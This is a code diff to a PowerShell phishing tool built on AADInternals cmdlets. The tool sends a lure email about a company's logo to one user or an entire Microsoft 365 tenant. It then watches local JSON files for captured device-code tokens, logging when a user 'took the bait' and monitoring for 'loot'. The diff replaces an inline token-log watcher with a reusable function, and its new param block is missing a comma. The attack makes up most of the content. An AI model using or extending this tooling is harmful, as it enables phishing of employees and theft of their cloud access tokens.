@@ -73,10 +73,66 @@ Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.ref
 
 $teamsMessage = $messageContent
 
+function Monitor-JsonFiles {
+    param(
+        [string]$user
+        [int]$DurationInMinutes = 15,
+        [string]$mailUser
+    )
+
+    # Get the current time and calculate the expiration time
+    $currentDateTime = Get-Date
+    $expirationDateTime = $currentDateTime.AddMinutes($DurationInMinutes)
+    Write-Output "Monitoring will expire at $expirationDateTime."
+
+    # Define the folder to monitor (current directory)
+    $folder = $PWD.Path
+
+    # Create a FileSystemWatcher to monitor JSON files in the current directory
+    $fileWatcher = New-Object System.IO.FileSystemWatcher
+    $fileWatcher.Path = $folder
+    $fileWatcher.Filter = "*.json"
+    $fileWatcher.NotifyFilter = [System.IO.NotifyFilters]'FileName, LastWrite'
+
+    # Define the action to take when a JSON file is changed or created
+    $action = {
+        param($source, $e)
+        Write-Host "$user took the bait."
+        Write-Host "File updated: $($e.FullPath)"
+        # Display the new content or perform other actions
+        Get-Content -Path $e.FullPath
+        # Break the loop
+        $script:exitLoop = $true
+    }
+
+    # Set up the event handler for changed and created files
+    $onChange = Register-ObjectEvent $fileWatcher "Changed" -Action $action
+    $onCreate = Register-ObjectEvent $fileWatcher "Created" -Action $action
+
+    Write-Host "Monitoring $folder for loot until $expirationDateTime..."
+
+    # Initialize exit loop variable
+    $script:exitLoop = $false
+
+    # Monitor until the expiration time is reached or the exit loop is set to true
+    while ((Get-Date) -lt $expirationDateTime -and -not $script:exitLoop) {
+        Start-Sleep -Seconds 2
+    }
+
+    # Clean up
+    Unregister-Event -SourceIdentifier $onChange.Name
+    Unregister-Event -SourceIdentifier $onCreate.Name
+    $fileWatcher.EnableRaisingEvents = $false
+    $fileWatcher.Dispose()
+
+    Write-Output "Device Code expired at $expirationDateTime."
+    Write-Output "Pretty soon Ler's yellin 'Phish on!'"
+}
+
+
 ### Conditional logic for Sending Messages
 if ($targetUser) {
     if ($targetUser -eq "all") {
-
         $users = Get-Content ".\users.json"
         foreach ($user in $users) {
             Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
@@ -96,85 +152,14 @@ if ($targetUser) {
         if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
         Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
         
-        # Get the current time and calculate the expiration time
-        $currentDateTime = Get-Date
-        $expirationDateTime = $currentDateTime.AddMinutes(15)
-        Write-Output "Device Code expires at $expirationDateTime."
-
-        # Define the path to the file
-        $filePath = ".\TokenLog.json"
-        $folder = Split-Path -Parent $filePath
-        $file = Split-Path -Leaf $filePath
-
-        # Create a FileSystemWatcher
-        $fileWatcher = New-Object System.IO.FileSystemWatcher
-        $fileWatcher.Path = $folder
-        $fileWatcher.Filter = $file
-        $fileWatcher.NotifyFilter = [System.IO.NotifyFilters]'LastWrite'
-
-        # Define the action to take when the file is changed
-        $action = {
-            Write-Host "New tokens added to log"
-            # Display the new content or perform other actions
-            Get-Content $filePath
-        }
-
-        # Set up the event handler
-        $eventHandler = Register-ObjectEvent $fileWatcher "Changed" -Action $action
-
-        Write-Host "Monitoring $filePath for changes until $expirationDateTime..."
-
-        # Monitor until the expiration time is reached
-        while ((Get-Date) -lt $expirationDateTime) {
-            Start-Sleep -Seconds 2
-        }
-
-        # Clean up
-        Unregister-Event -SourceIdentifier $eventHandler.Name
-        $fileWatcher.EnableRaisingEvents = $false
-        $fileWatcher.Dispose()
-
-        Write-Host "Monitoring stopped as the DeviceCode expired at $expirationDateTime"
-        
-        # # Get the current time
-        # $currentDateTime = Get-Date
-        # # Add 15 minutes to the current time
-        # $newDateTime = $currentDateTime.AddMinutes(15)
-        # # Format the new date and time for output
-        # $formattedDateTime = $newDateTime.ToString("yyyy-MM-dd HH:mm:ss")
-        # # Output the message with the new time
-        # Write-Output "DeviceCode expires at $formattedDateTime"
-
-        # # Define the path to the file
-        # $filePath = ".\TokenLog.json"
-        # $folder = Split-Path -Parent $filePath
-        # $file = Split-Path -Leaf $filePath
-
-        # # Create a FileSystemWatcher
-        # $fileWatcher = New-Object System.IO.FileSystemWatcher
-        # $fileWatcher.Path = $folder
-        # $fileWatcher.Filter = $file
-        # $fileWatcher.NotifyFilter = [System.IO.NotifyFilters]'LastWrite'
-
-        # # Define the action to take when the file is changed
-        # $action = {
-        #     Write-Host "New tokens added to log"
-        #     # Display the new content or perform other actions
-        #     Get-Content $filePath
-        # }
-
-        # # Set up the event handler
-        # Register-ObjectEvent $fileWatcher "Changed" -Action $action
-
-        # Write-Host "Monitoring $filePath for changes. Press any key to exit..."
-        # Read-Host
-
-        # # Clean up
-        # Unregister-Event -SourceIdentifier FileChanged
-        # $fileWatcher.EnableRaisingEvents = $false
-        # $fileWatcher.Dispose()
+        Monitor-JsonFiles -DurationInMinutes 15
+        # .\LootStash.ps1
+        # $loot = ".\loot"
+        # if(Test-Path $loot ){ Write-Output "Loot folder: "; Get-ChildItem $loot }    
     }
 } else {
+
     Write-Host "No Target user specified. No emails sent."
-}
+    
+    }
 }
